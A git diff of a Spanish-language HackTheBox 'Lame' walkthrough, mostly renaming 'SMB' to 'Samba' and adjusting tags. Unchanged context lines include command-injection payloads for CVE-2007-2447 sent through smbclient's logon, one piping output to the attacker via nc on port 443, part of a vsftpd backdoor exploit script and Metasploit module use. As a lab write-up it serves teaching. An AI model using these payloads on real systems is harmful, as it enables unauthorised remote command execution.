@@ -19,7 +19,7 @@ tags:
   - Username Map Script Command Execution (UMSCE)
   - CVE-2007-2447
   - Command Injection
-  - Privesc - UMSCE
+  - Privesc - UMSCE (CVE-2007-2447)
   - OSCP Style
   - Metasploit Framework
 ---
@@ -28,6 +28,7 @@ tags:
 La **máquina Lame** es una de las primeras máquinas que hice, justo después del **Starting Point**, obviamente necesité mucha ayuda porque había cosas que aún no comprendía del todo. Es una máquina super fácil, ya que lo único que haremos será utilizar el **servicio Samba** para poder obtener acceso directo a la máquina. Para esto, haremos enumeración a un **servicio FTP** para encontrar información que nos sea útil, al no encontrar nada,  usamos un Exploit para la versión del FTP (**CVE-2011-2523**) para crear una **Backdoor** en la máquina víctima, pero no funcionara, por lo que mejor decidimos enumerar el **servicio Samba** con **smbclient**, para ver si encontramos algo útil. Al tampoco encontrar nada, usamos el Exploit **CVE-2007-2447** para obtener acceso a la máquina como **usuario root**, usando el Exploit  tanto en **estilo OSCP** como en **estilo Metasploit**.
 
 Herramientas utilizadas para resolver está máquina:
+* *ping*
 * *nmap*
 * *ftp*
 * *searchsploit*
@@ -51,7 +52,7 @@ Herramientas utilizadas para resolver está máquina:
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
-				<li><a href="#SMB">Enumeración Servicio SMB</a></li>
+				<li><a href="#Samba">Enumeración Servicio Samba</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
@@ -256,9 +257,9 @@ local: /etc/passwd remote: /etc/passwd
 ```
 No se puede, por lo que deducimos que no tenemos permisos de escritura. Aunque, quizá hay un exploit que podamos usar aquí.
 
-<h2 id="SMB">Enumeración Servicio SMB</h2>
+<h2 id="Samba">Enumeración Servicio Samba</h2>
 
-Ahora nos logueamos en el **servicio SMB** para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.
+Ahora nos logueamos en el **servicio Samba** para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.
 
 Primero vamos a tratar de mostrar los recursos compartidos que estén a nivel de red, para ver si hay algo útil.
 ```bash
@@ -362,7 +363,6 @@ tn2=Telnet(host, 6200)
 print('Success, shell opened')
 print('Send `exit` to quit shell')
 tn2.interact()
-
 ```
 
 | Parámetros | Descripción |
@@ -376,7 +376,7 @@ Lo que hace este Exploit es, tratar de conectarnos al **servicio FTP** a través
 
 <h2 id="Busqueda">Buscando, Analizando y Probando un Exploit para Servicio Samba</h2>
 
-Como mencione anteriormente, como no encontramos mucho en el **servicio SMB** lo que podemos hacer es buscar un exploit para el **servicio Samba** que nos ayude.
+Como mencione anteriormente, como no encontramos mucho en el **servicio Samba** lo que podemos hacer es buscar un exploit para el **servicio Samba** que nos ayude.
 ```bash
 searchsploit Samba 3.0.20      
 ---------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -422,7 +422,7 @@ tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
-Desde el **servidor SMB** mandamos la traza:
+Desde el **servidor Samba** mandamos la traza:
 ```bash
 smb: \> logon "/=`nohup ping Tu_IP`"
 Password: 
@@ -453,7 +453,7 @@ nc -lvnp 443
 listening on [any] 443 ...
 ```
 
-Inyectando comando, desde la **sesión de SMB**:
+Inyectando comando, desde la **sesión de Samba**:
 ```bash
 smb: \> logon "/=`nohup whoami | nc Tu_IP 443`"
 Password: 
@@ -592,7 +592,7 @@ Interact with a module by name or index. For example info 0, use 0 or use exploi
 ```
 
 Para usarlo solamente escribimos el nombre y el comando **use**:
-```
+```bash
 msf6 > use exploit/multi/samba/usermap_script
 [*] No payload configured, defaulting to cmd/unix/reverse_netcat
 msf6 exploit(multi/samba/usermap_script) >
